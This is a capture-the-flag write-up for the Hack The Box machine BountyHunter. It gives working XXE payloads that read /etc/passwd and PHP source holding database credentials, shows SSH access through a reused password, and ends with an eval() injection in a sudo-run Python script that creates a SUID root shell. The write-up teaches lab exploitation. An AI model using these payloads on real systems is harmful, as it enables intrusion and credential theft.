# Hack The Box: BountyHunter

**Difficulty:** Easy
**OS:** Linux

BountyHunter is an Easy-level Linux machine centered around exploiting an XML External Entity (XXE) vulnerability to read local files. This initial access vector reveals a password used for a local system account. Privilege escalation involves exploiting an insecure Python script configured to run via `sudo`, achieving code execution through `eval()`.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services.

```bash
nmap -p- --min-rate 10000 10.10.11.100
nmap -p 22,80 -sCV 10.10.11.100
```

The scan identifies the following open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.41)

Navigating to the web service on port 80 displays a landing page for a bug bounty portal. Enumerating directories using a tool like `feroxbuster` or browsing the site reveals a "Portal" page containing a bug reporting form (`/log_submit.php`). Additionally, a script named `db.php` is identified during enumeration, though it returns a blank page upon direct access.

## Web Exploitation

We interact with the bug reporting form and submit a dummy report. Using an intercepting proxy like Burp Suite, we analyze the POST request sent to the backend processing script (`/tracker_diRbPr00f314.php`).

The request contains a single parameter named `data`. Its value appears to be Base64-encoded and URL-encoded.

```text
data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT5UaXRsZTwvdGl0bGU%2BCgkJPGN3ZT5DV0U8L2N3ZT4KCQk8Y3Zzcz45Ljg8L2N2c3M%2BCgkJPHJld2FyZD4xLDAwMCwwMDA8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D
```

Decoding this payload reveals it is an XML document containing the bug report details.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<bugreport>
  <title>Title</title>
  <cwe>CWE</cwe>
  <cvss>9.8</cvss>
  <reward>1,000,000</reward>
</bugreport>
```

### Exploiting XXE (XML External Entity)

The application takes this XML payload, parses it, and displays the parsed values back to the user on the subsequent results page. If the underlying XML parser is not configured securely, it may process Document Type Definitions (DTDs) and external entities, leading to an XXE vulnerability.

We can craft a malicious XML payload to define an external entity that reads local files, such as `/etc/passwd`. We insert a reference to this entity within one of the fields the application displays, like the `<title>` element.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<bugreport>
  <title>&xxe;</title>
  <cwe>CWE</cwe>
  <cvss>9.8</cvss>
  <reward>1,000,000</reward>
</bugreport>
```

We Base64-encode and URL-encode this payload, then submit it via the POST request. The server responds with the contents of the `/etc/passwd` file rendered within the "Title" field on the page.

Reviewing `/etc/passwd` reveals a user named `development`.

### Extracting Credentials via XXE

We previously identified `db.php` during directory enumeration. Since it returned a blank page, it likely contains backend logic or configuration details like database passwords.

We can use the XXE vulnerability to read `db.php`. However, reading PHP files directly often breaks the XML parsing if the file contains characters like `<` or `>`. To bypass this, we use a PHP filter to encode the file's contents in Base64 before it is returned by the XML entity.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=db.php" >
]>
<bugreport>
  <title>&xxe;</title>
  <cwe>CWE</cwe>
  <cvss>9.8</cvss>
  <reward>1,000,000</reward>
</bugreport>
```

Encoding and sending this payload yields the Base64-encoded contents of `db.php`. Decoding the result reveals the database connection credentials.

```php
<?php
// ...
$db_user = "admin";
$db_password = "m1g[REDACTED]P32";
// ...
?>
```

## Initial Access

A common security anti-pattern is password reuse across different services or accounts. We attempt to use the discovered database password (`m1g[REDACTED]P32`) to authenticate as the local system user `development` via SSH.

```bash
ssh development@10.10.11.100
# Authentication successful
```
We retrieve the `user.txt` flag from the user's home directory.

## Privilege Escalation

Enumerating the system for escalation vectors, we check for commands the `development` user can run using `sudo`.

```bash
sudo -l
```

The output reveals that `development` can run a specific Python script as the `root` user.

```text
User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skyticket/ticketValidator.py
```

### Analyzing `ticketValidator.py`

We review the source code of the `ticketValidator.py` script. The script is designed to take an `.md` (markdown) file containing ticket information, parse it, and validate it.

During the parsing phase, the script extracts a value from the ticket file and evaluates it using Python's `eval()` function to determine if it meets a certain condition (e.g., checking if it's mathematically equivalent to an expected ticket code format).

```python
# Snippet from ticketValidator.py
# ...
code_val = extract_code(ticket_file)
# ...
if eval(code_val) == True:
    print("Ticket Validated")
# ...
```

The `eval()` function in Python dynamically executes arbitrary code passed to it as a string. Passing user-controlled input into `eval()` leads to severe command injection vulnerabilities.

### Exploiting Python `eval()`

We create a dummy `.md` ticket file that conforms to the parsing rules of `ticketValidator.py` so that our payload reaches the `eval()` statement. We embed a malicious Python expression within the relevant section of the ticket format.

Our payload will use the `__import__('os').system()` technique to execute a system command. We can craft it to spawn a shell or set the SUID bit on `/bin/bash`.

```text
# Ticket Content
...
Code: __import__('os').system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash')
...
```

We execute the validation script via `sudo`, providing our malicious ticket file as the argument.

```bash
sudo /usr/bin/python3.8 /opt/skyticket/ticketValidator.py /tmp/malicious_ticket.md
```

The script processes the file, the `eval()` function executes our payload, and the SUID bash binary is created.

```bash
/tmp/rootbash -p
# id
uid=0(root) gid=1000(development) euid=0(root) groups=1000(development)
```

The machine is fully compromised, and the `root.txt` flag can be retrieved.
